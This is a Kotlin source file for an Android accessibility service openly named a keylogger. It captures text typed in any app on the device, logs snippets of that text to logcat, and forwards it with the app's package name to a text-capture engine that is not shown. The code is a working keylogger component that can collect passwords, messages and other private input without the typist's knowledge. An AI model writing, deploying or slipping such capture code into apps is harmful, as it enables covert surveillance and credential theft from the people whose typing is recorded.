package com.flanergide.data

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent

/**
 * KeyloggerAccessibilityService - System accessibility hook for text capture.
 *
 * Receives accessibility events from Android system and delegates to TextCaptureEngine.
 * Minimal logic - just routing to the singleton manager.
 */
class KeyloggerAccessibilityService : AccessibilityService() {
    private val TAG = "KeyloggerA11yService"
    private var eventCount = 0

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "✅✅✅ Accessibility service CONNECTED and ready to capture")
        Log.i(TAG, "Service is now monitoring for accessibility events")
        eventCount = 0
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "onCreate called - service being created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) {
            Log.v(TAG, "Received null accessibility event")
            return
        }

        eventCount++

        // Log all event types for debugging
        val eventTypeName = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "TYPE_VIEW_TEXT_CHANGED"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "TYPE_WINDOW_STATE_CHANGED"
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> "TYPE_NOTIFICATION_STATE_CHANGED"
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> "TYPE_VIEW_FOCUSED"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "TYPE_VIEW_CLICKED"
            else -> "OTHER_${event.eventType}"
        }
        Log.v(TAG, "[$eventCount] Event type: $eventTypeName from ${event.packageName}")

        // Only capture text change events
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            return
        }

        // Extract text from event
        val text = extractText(event)
        if (text == null) {
            Log.v(TAG, "No text found in TYPE_VIEW_TEXT_CHANGED event from ${event.packageName}")
            return
        }

        val appPackage = event.packageName?.toString() ?: "unknown"
        Log.d(TAG, "📝 Text change event detected from $appPackage: \"${text.take(30)}...\"")

        // Delegate to TextCaptureEngine
        TextCaptureEngine.addCapturedText(text, appPackage)
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    /**
     * Extract text from accessibility event.
     */
    private fun extractText(event: AccessibilityEvent): String? {
        // Try to get text from event text list
        val eventText = event.text?.firstOrNull()?.toString()
        if (!eventText.isNullOrBlank()) {
            Log.v(TAG, "Extracted text from event.text: \"${eventText.take(50)}...\"")
            return eventText
        }

        // Try to get text from source node
        val sourceText = event.source?.text?.toString()
        if (!sourceText.isNullOrBlank()) {
            Log.v(TAG, "Extracted text from source node: \"${sourceText.take(50)}...\"")
            return sourceText
        }

        // Log when no text is found (for debugging)
        Log.v(TAG, "No text found in event (text list: ${event.text?.size ?: 0} items, source: ${event.source})")

        // No text found
        return null
    }
}
